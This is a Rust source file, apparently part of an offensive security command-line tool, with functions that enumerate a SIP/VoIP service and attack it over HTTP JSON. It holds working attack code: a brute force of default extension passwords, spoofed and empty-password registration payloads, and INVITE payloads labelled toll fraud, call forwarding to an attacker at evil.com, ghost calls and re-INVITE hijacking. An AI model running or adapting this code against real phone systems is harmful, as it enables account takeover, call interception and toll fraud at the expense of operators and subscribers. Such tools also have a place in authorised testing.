use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SIP/VoIP Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let status = resp.status().as_u16();
    let headers = resp.headers().clone();
    let body = resp.text().await.unwrap_or_default();

    if status == 200 {
        println!("  {} SIP service responding", "[+]".green().bold());
    }

    if let Some(server) = headers.get("server") {
        println!("  Server: {}", server.to_str().unwrap_or("unknown"));
    }

    let sip_headers = ["Allow", "Supported", "Accept", "Contact"];
    for h in &sip_headers {
        if let Some(val) = headers.get(*h) {
            println!("  {}: {}", h, val.to_str().unwrap_or(""));
        }
    }

    if body.contains("sip:") || body.contains("SIP/") {
        println!("  {} SIP protocol confirmed", "[+]".green().bold());
    }

    Ok(())
}

pub async fn brute(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SIP Credential Brute Force", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let extensions = ["100", "101", "102", "200", "201", "1000", "1001", "admin", "user", "test"];
    let passwords = ["", "password", "1234", "admin", "sip", "extension", "passw0rd"];

    for ext in &extensions {
        for pass in &passwords {
            let body = serde_json::json!({"extension": ext, "password": pass, "action": "register"});
            match client.post(url).json(&body).send().await {
                Ok(r) => {
                    let status = r.status().as_u16();
                    let text = r.text().await.unwrap_or_default();
                    if status == 200 && (text.contains("ok") || text.contains("registered") || text.contains("success")) {
                        println!("  {} Ext {:6} Pass {:12} — REGISTERED", "[+]".green().bold(), ext, if pass.is_empty() { "(empty)" } else { pass });
                    }
                }
                Err(_) => {}
            }
        }
    }

    Ok(())
}

pub async fn register(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SIP Registration Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let spoofed = [
        ("Fake caller", r#"{"from": "sip:attacker@evil.com","to": "sip:victim@target.com","action": "register"}"#),
        ("Extension hijack", r#"{"extension": "100","password": "100","action": "register"}"#),
        ("Domain spoof", r#"{"from": "sip:admin@target.com","domain": "evil.com","action": "register"}"#),
        ("Auth bypass", r#"{"extension": "999","password": "","action": "register"}"#),
    ];

    for (name, payload) in &spoofed {
        match client.post(url).header("Content-Type", "application/json").body(*payload).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && (text.contains("ok") || text.contains("registered")) {
                    println!("  {} {:20} — REGISTERED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn invite(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SIP INVITE Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let invite_payloads = [
        ("Toll fraud", r#"{"from": "sip:internal@target.com","to": "sip:external@premium-rate.com","action": "invite"}"#),
        ("Call forwarding", r#"{"from": "sip:victim@target.com","to": "sip:attacker@evil.com","action": "invite"}"#),
        ("Ghost call", r#"{"from": "sip:anonymous@anonymous.invalid","to": "sip:anyone@target.com","action": "invite"}"#),
        ("Re-INVITE hijack", r#"{"from": "sip:legit@target.com","to": "sip:attacker@evil.com","action": "reinvite"}"#),
    ];

    for (name, payload) in &invite_payloads {
        match client.post(url).header("Content-Type", "application/json").body(*payload).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && (text.contains("ok") || text.contains("ringing") || text.contains("trying")) {
                    println!("  {} {:20} — INVITE ACCEPTED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}
